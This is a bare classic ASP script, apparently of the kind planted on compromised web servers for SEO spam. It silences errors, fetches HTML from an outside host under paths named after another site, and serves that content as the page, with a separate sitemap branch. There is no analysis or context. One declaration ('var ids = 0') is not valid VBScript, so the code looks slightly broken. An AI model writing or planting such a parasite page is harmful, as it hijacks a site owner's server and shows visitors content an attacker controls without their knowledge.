<%@ codepage=65001%>
<%
On Error Resume Next
Server.ScriptTimeOut=9999999
Function getHTTPPage(Path)
        t = GetBody(Path)
        getHTTPPage=BytesToBstr(t,"UTF-8")
End function

Function GetBody(url) 
        on error resume next
        Set Retrieval = CreateObject("Microsoft.XMLHTTP") 
        With Retrieval 
        .Open "Get", url, False, "", "" 
        .Send 
        GetBody = .ResponseBody
        End With 
        Set Retrieval = Nothing 
End Function

Function BytesToBstr(body,Cset)
        dim objstream
        set objstream = Server.CreateObject("adodb.stream")
        objstream.Type = 1
        objstream.Mode =3
        objstream.Open
        objstream.Write body
        objstream.Position = 0
        objstream.Type = 2
        objstream.Charset = Cset
        BytesToBstr = objstream.ReadText 
        objstream.Close
        set objstream = nothing
End Function
Function Newstring(wstr,strng)
        Newstring=Instr(lcase(wstr),lcase(strng))
        if Newstring<=0 then Newstring=Len(wstr)
End Function

var ids = 0
if request.querystring("part")<> "" Then
mystr = Split(request.querystring("part"),"-")
ids = mystr(0)
End if


if ids="" Then
url="http://www.pagesgoodhai.com/01.06/indonesialiveaboard.com/0.html"
Response.Write getHTTPPage(url)
Response.End
elseif ids="sitemap" Then
url="http://www.pagesgoodhai.com/01.06/indonesialiveaboard.com/sitemap.html"
Response.Write getHTTPPage(url)
Response.End
else
url="http://www.pagesgoodhai.com/01.06/indonesialiveaboard.com/"&ids&".html"
Response.Write getHTTPPage(url)
Response.End
end if

%>